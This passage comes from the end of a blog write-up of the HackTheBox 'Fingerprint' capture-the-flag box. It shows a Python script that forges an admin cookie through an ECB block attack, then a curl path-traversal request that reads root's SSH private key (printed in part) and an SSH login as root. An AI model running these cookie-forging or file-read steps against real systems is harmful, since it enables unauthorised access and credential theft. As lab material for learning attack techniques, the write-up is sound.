<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python</span><br><span class="line">Python 3.10.4 (main, Mar 23 2022, 23:05:40) [GCC 11.2.0] on linux</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; SECRET = <span class="string">&quot;7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!&quot;</span></span><br><span class="line">&gt;&gt;&gt; uid = <span class="string">&quot;hg8,7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!,true,7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!,false&quot;</span></span><br><span class="line">&gt;&gt;&gt; split = uid.split(<span class="string">&quot;,&quot;</span> + SECRET + <span class="string">&quot;,&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(split)</span><br><span class="line">[<span class="string">&#x27;hg8&#x27;</span>, <span class="string">&#x27;true&#x27;</span>, <span class="string">&#x27;false&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(split[1])</span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>Let’s now script this to create and receive the correct <code>admin</code> cookie:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">start_block_gap = <span class="number">64</span></span><br><span class="line">known = <span class="string">&quot;,7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!,true&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;user_id&quot;</span>:<span class="string">&quot;49f5f0062780bed62dc06bf4a8d2dd9cb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb&quot;</span>&#125;</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">r = s.post(<span class="string">&quot;http://127.0.0.1:8088/profile&quot;</span>, data = &#123;<span class="string">&quot;new_name&quot;</span>:<span class="string">&quot;A&quot;</span>*(start_block_gap-<span class="built_in">len</span>(known))+known&#125;, cookies=cookies, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">user_id = r.cookies[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(user_id)</span><br></pre></td></tr></table></figure>

<p>Let’s run it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python admin_cookie.py</span><br><span class="line">feb0765bda04614d2f52acc15414e80afb4f34faed3576cfcf70f713ffea485b01b1b06d23e2c6c8eacc793c07597edc4beba4fa5b1c380302525ee6e935282ff30abe9eba1c358b7a675b5e1e9ad7548c9b3fefd732c4a597b9edd3bebc9e1cf45c2407de3a6ead5cc9b932f55fdf92c5dd1d4c7488606dc98abd2d888f12ef</span><br></pre></td></tr></table></figure>

<h3 id="LFI-as-root"><a href="#LFI-as-root" class="headerlink" title="LFI as root"></a>LFI as root</h3><p>Among other things a good idea is to try the LFI vulnerability we found at the beginning to see if this updated version is still vulnerable and runs with higher privileges thanks to our <code>admin</code> cookie.<br>And… Bingo!</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl --path-as-is <span class="string">&quot;http://127.0.0.1:8088/admin/view/../../root/.ssh/id_rsa&quot;</span> --cookie <span class="string">&quot;user_id=feb0765bda04614d2f52acc15414e80afb4f34faed3576cfcf70f713ffea485b01b1b06d23e2c6c8eacc793c07597edc4beba4fa5b1c380302525ee6e935282ff30abe9eba1c358b7a675b5e1e9ad7548c9b3fefd732c4a597b9edd3bebc9e1cf45c2407de3a6ead5cc9b932f55fdf92c5dd1d4c7488606dc98abd2d888f12ef&quot;</span></span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpQIBAAKCAQEAvBdEECQOhzxNhtcyq8/TU6T1hbSK2WYbpF3OBMlCKUeh5Z62</span><br><span class="line">i9RmFG1BVU5i7IMAVelL92WrGgYXfp2A9oIeLugEIjGcqAkK0aqWM6PnaSvGsnzj</span><br><span class="line">wmncPtNqudxWMPMozOc5baf9RIWDGG84KZrhk+FMt75amL6uFgz/ztXsHAotrBF8</span><br><span class="line">[...]</span><br><span class="line">pUY3RgECgYEAyWrVpT9rI4j2pDC/ht54dtCltxw+jcZp5F57IsAy7ldlsefuwoNr</span><br><span class="line">GWUYBeBWuK8vx14XYNvMt45eg/GaU02VSoczuNPIvOoKbrH3+BXK290zxvwznqTS</span><br><span class="line">oggFxgjTq+oAawHPmDGDrWgqoa/Aecd6C0t94Tv7avfE9ZBJ4QWMsms=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh root@fingerprint.htb -i id_rsa</span><br><span class="line"></span><br><span class="line">Last login: Wed Jan 26 16:38:01 2022</span><br><span class="line">root@fingerprint:~<span class="comment"># cat root.txt</span></span><br><span class="line">3c8cxxxxxxxxxx4eee585</span><br></pre></td></tr></table></figure>

<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a target="_blank" rel="noopener" href="https://blog.h3xstream.com/2014/02/hql-for-pentesters.html">HQL for Pentesters</a><br><a target="_blank" rel="noopener" href="https://zachgrace.com/posts/attacking-ecb/">Attacking ECB</a><br><a target="_blank" rel="noopener" href="https://c0nradsc0rner.com/2016/07/03/ecb-byte-at-a-time/">ECB Byte at a Time</a> </p>
<hr>
<p>That’s it folks! As always do not hesitate to contact me for any questions or feedback!</p>
<p>See you next time ;)</p>
<p>-hg8</p>

  </div>
</article>
<br>
<br>


    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/Insane-Box/">Insane Box</a>
    </div>



    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/Bruteforce/" rel="tag">Bruteforce</a>, <a class="tag-link-link" href="/tags/Command-Injection/" rel="tag">Command Injection</a>, <a class="tag-link-link" href="/tags/Cookie-Forge/" rel="tag">Cookie Forge</a>, <a class="tag-link-link" href="/tags/Crypto/" rel="tag">Crypto</a>, <a class="tag-link-link" href="/tags/ECB/" rel="tag">ECB</a>, <a class="tag-link-link" href="/tags/Flask/" rel="tag">Flask</a>, <a class="tag-link-link" href="/tags/HQL-Injection/" rel="tag">HQL Injection</a>, <a class="tag-link-link" href="/tags/JWT/" rel="tag">JWT</a>, <a class="tag-link-link" href="/tags/LFI/" rel="tag">LFI</a>, <a class="tag-link-link" href="/tags/Reverse-Shell/" rel="tag">Reverse Shell</a>, <a class="tag-link-link" href="/tags/SUID/" rel="tag">SUID</a>, <a class="tag-link-link" href="/tags/XSS/" rel="tag">XSS</a>, <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>
    </div>





        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-flag"><span class="toc-number">1.</span> <span class="toc-text">User flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Local-File-Inclusion"><span class="toc-number">1.2.</span> <span class="toc-text">Local File Inclusion</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#users-db-database"><span class="toc-number">1.3.</span> <span class="toc-text">users.db database</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-on-auth-log"><span class="toc-number">1.4.</span> <span class="toc-text">XSS on auth.log</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HQL-Injection"><span class="toc-number">1.5.</span> <span class="toc-text">HQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Authentication-Bypass"><span class="toc-number">1.6.</span> <span class="toc-text">Authentication Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Backups"><span class="toc-number">1.7.</span> <span class="toc-text">Backups</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Admin-cookie-forging"><span class="toc-number">1.8.</span> <span class="toc-text">Admin cookie forging</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Command-Injection-to-Remote-Code-Execution"><span class="toc-number">1.9.</span> <span class="toc-text">Command Injection to Remote Code Execution</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-www-data-%E2%86%92john"><span class="toc-number">1.10.</span> <span class="toc-text">Pivot www-data →john</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ECB-Attack"><span class="toc-number">2.2.</span> <span class="toc-text">ECB Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Determining-ECB-Block-Size"><span class="toc-number">2.3.</span> <span class="toc-text">Determining ECB Block Size</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ECB-Attack-1"><span class="toc-number">2.4.</span> <span class="toc-text">ECB Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie-forging-part-2"><span class="toc-number">2.5.</span> <span class="toc-text">Cookie forging - part 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI-as-root"><span class="toc-number">2.6.</span> <span class="toc-text">LFI as root</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">3.</span> <span class="toc-text">References</span></a></li></ol>
    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023
    <a href="https://hg8.sh">hg8.sh</a>
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


    
<script src="/lib/jquery/jquery.min.js"></script>


<script src="/js/main.js"></script>




</body>
</html>
